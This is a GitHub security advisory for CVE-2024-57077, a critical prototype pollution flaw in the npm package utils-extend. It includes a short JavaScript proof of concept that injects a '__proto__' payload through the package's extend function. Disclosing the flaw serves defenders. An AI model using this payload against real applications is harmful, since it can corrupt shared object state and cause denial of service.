# [C] utils-extend Prototype Pollution

## Summary
Severity: Critical
Advisory: GHSA-7qgg-vw88-cc99
CVE: CVE-2024-57077
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2025-02-06
Source: https://github.com/advisories/GHSA-7qgg-vw88-cc99
Type: github-advisory

## Affected
- npm: `utils-extend` — affected >=0

## Details
The latest version of utils-extend (1.0.8) is vulnerable to Prototype Pollution through the entry function(s) lib.extend. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.

## PoC
```js
async function exploit() {
   const utilsextend = require(\"utils-extend\");
   const payload = JSON.parse('{\"__proto__\":{\"exploited\":true}}');
   const result = await utilsextend.extend({}, payload);
}

await exploit();
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2024-57077
- https://gist.github.com/tariqhawis/64bac50f8c2706e6880e45d50a507114
- https://github.com/douzi8/utils-extend
